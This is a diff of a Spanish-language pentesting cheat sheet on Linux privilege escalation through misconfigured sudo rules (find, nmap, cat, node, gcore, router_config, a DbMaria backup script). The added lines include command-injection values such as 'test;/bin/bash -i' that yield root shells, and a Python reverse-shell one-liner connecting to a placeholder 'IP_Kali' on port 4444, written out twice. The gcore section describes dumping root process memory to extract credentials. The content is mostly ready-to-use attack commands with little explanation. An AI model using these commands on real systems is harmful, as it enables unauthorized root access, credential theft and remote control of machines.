@@ -20,7 +20,8 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 ### Find
 ```bash
-❯ sudo -l    # Ejecutar el comando 'find' sin password
+❯ sudo -l    
+# Ejecutar el comando 'find' sin password
 	# (ALL : ALL) ALL
 	# ALL=(root) NOPASSWD: /usr/bin/find
 	
@@ -31,7 +32,8 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 ### Nmap como user2
 ```bash
-❯ sudo -l      # Ejecutar el comando 'nmap' siendo 'user2' sin passwd
+❯ sudo -l      
+# Ejecutar el comando 'nmap' siendo 'user2' sin passwd
 	#  (user2) NOPASSWD: /usr/bin/nmap 
 
 # Ejecutar el comando de la siguiente manera:
@@ -41,7 +43,8 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 ### Passwd como user2
 ```bash 
-❯ sudo -l       # Cambiar de usuario sin password 
+❯ sudo -l       
+# Cambiar de usuario sin password 
 	#  (user1 : user2) NOPASSWD: /bin/bash 
 
 # Ejecutar el comando de la siguiente manera:
@@ -50,7 +53,8 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 ### Cat
 ```bash 
-❯ sudo -l       # Ejecutar el comando 'cat' sin password 
+❯ sudo -l       
+# Ejecutar el comando 'cat' sin password 
 	#  (root) NOPASSWD: /bin/cat  
 
 # Ejecutar el comando en la maquina vítima de la siguiente manera:
@@ -64,7 +68,8 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 ### Node
 ```bash 
-❯ sudo -l     # Ejecutar el comando 'node' sin password pero obligado a una ruta 
+❯ sudo -l     
+# Ejecutar el comando 'node' sin password pero obligado a una ruta 
 	# (ALL) /usr/bin/node /usr/local/scripts/*.js   
 
 Paso 1:
@@ -79,12 +84,14 @@ Paso 2:
 ### Gcore
 Genera un dump de la memoria de un proceso activo. Si un proceso tiene credenciales, claves SSH, o datos sensibles en RAM, los podés extraer.
 ```bash 
-❯ sudo -l       # Ejecutar el comando 'gcore' sin password
+❯ sudo -l       
+# Ejecutar el comando 'gcore' sin password
 	# (ALL) NOPASSWD: /usr/bin/gcore
 
 Paso 1:
 ❯ ps aux | grep "^root" | grep -v "\["   # Identificar procesos de root existentes 
-	root       494  0.0  0.0   2276    68 ?        Ss   12:25   0:00 /usr/bin/password-store    # Donde el PID es '494' en este caso 
+	root       494  0.0  0.0   2276    68 ?        Ss   12:25   0:00 /usr/bin/password-store    
+# Donde el PID es '494' en este caso 
 
 Paso 2:
 ❯ sudo gcore PID    # Genera un archivo llamado 'core.PID'
@@ -106,10 +113,36 @@ Paso 3:
 
 ### Router_Config 
 ```bash 
-❯ sudo -l       # Ejecutar el comando 'router_config'
+❯ sudo -l       
+# Ejecutar el comando 'router_config' sin password
 	# (ALL) NOPASSWD: /usr/bin/router_config
 
 ❯ sudo /usr/bin/router_config "test;whoami"
 ❯ sudo /usr/bin/router_config "test;id"   # Mirar el ID de root 
-❯ sudo /usr/bin/router_config "test;/bin/bash -i"  # Obtener shell con root 
+❯ sudo /usr/bin/router_config "test;/bin/bash -i"  # Obtener shell con root (Puede estar limitada)
+```
+
+```bash 
+# Si se obtiene una shell limitada, ejecutar una reverse shell mediante Python para obtener una shell interactiva desde Kali
+❯ which python3   # Mirar si python3 esta instalado 
+❯ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_Kali",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+```
+
+### Script (DbMaria)
+```bash 
+❯ sudo -l       
+# Ejecutar el comando 'DbMaria' como root sin password
+	(root) NOPASSWD: /opt/backup/DbMaria
+
+❯ strings /opt/backup/DbMaria  # Mirar los strings (Hay pistas de lo que hace el script)
+❯ sudo /opt/backup/DbMaria     # Ejecutar el script para ver que hace
+
+❯ sudo /opt/backup/DbMaria "test; /bin/bash"  # Obtener shell con root (Puede estar limitada)
+# Se puede agregar o no el nombre oficial de la DB  
+```
+
+```bash 
+# Si se obtiene una shell limitada, ejecutar una reverse shell mediante Python para obtener una shell interactiva desde Kali
+❯ which python3   # Mirar si python3 esta instalado 
+❯ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_Kali",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
